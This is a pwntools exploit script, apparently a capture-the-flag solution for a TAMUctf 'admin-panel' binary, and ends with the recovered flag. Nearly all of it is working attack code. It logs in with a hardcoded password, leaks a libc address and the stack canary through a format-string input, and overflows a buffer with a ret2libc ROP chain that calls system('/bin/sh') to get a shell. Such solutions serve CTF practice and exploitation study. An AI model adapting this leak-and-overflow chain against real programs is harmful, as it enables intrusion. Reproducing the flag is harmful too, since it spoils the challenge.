from pwn import *

context.log_level = 'debug'
exe = './admin-panel_patched'
elf = ELF('./admin-panel_patched')
context.binary = elf

#libc = ELF('libc')
#ld = ELF('ld')

def start(argv=[], *a, **kw):
    if(sys.argv[1] == "d"):
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif(sys.argv[1] == "r"):
        return remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
    elif(sys.argv[1] == "l"):
        return process([exe] + argv, *a, **kw)

def s(a) : return io.send(a)
def sl(a) : return io.sendline(a)
def sa(a,b) : return io.sendafter(a,b)
def sla(a,b) : return io.sendlineafter(a,b)
def r(a) : return io.recv(a)
def ru(a) : return io.recvuntil(a)
def ra(a) : return io.recvall(a)
def rl() : return io.recvline()
def interactive() : return io.interactive()
def cls() : return io.close()
def p(a) : return log.info(a)
def suck(a) : return log.success(a)

gdbscript = '''
b main
b admin
c
'''.format(**locals())

#==========================================================
'''
 _   _                 _    _        _____                   
| | | |               | |  | |      |  __ \                  
| |_| | ___ _ __ ___  | |  | | ___  | |  \/ ___              
|  _  |/ _ \ '__/ _ \ | |/\| |/ _ \ | | __ / _ \             
| | | |  __/ | |  __/ \  /\  /  __/ | |_\ \ (_) |  _   _   _ 
\_| |_/\___|_|  \___|  \/  \/ \___|  \____/\___/  (_) (_) (_)
                                                             
'''                                                                                                                                                                                             
#==========================================================


io = start()

sla("16:", "admin")
sla("24:", "secretpass123" + 18*"a" + "a%17$p.%15$p")
rl()
rl()
leaks = rl().decode()
leak = leaks.split(".")[0]
canary = int(leaks.split(".")[1], 16)
p(f"leak : {leak}")
p(f"canary : {hex(canary)}")

libc_base = int(leak, 16) - 0x2409b
p(f"libc base {hex(libc_base)}")

pop_rdi = libc_base + 0x0000000000023a5f
binsh = libc_base + 0x18052c
system = libc_base + 0x44af0
ret = libc_base + 0x00000000000a5771

payload = b"a"*(9*8)
payload += p64(canary)
payload += b"a"*(8)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)

sla("1, 2 or 3:", "2")
sla("wrong:", payload)

interactive()
# flag --> gigem{l3ak1ng_4ddre55e5_t0_byp4ss_s3cur1t1e5!!}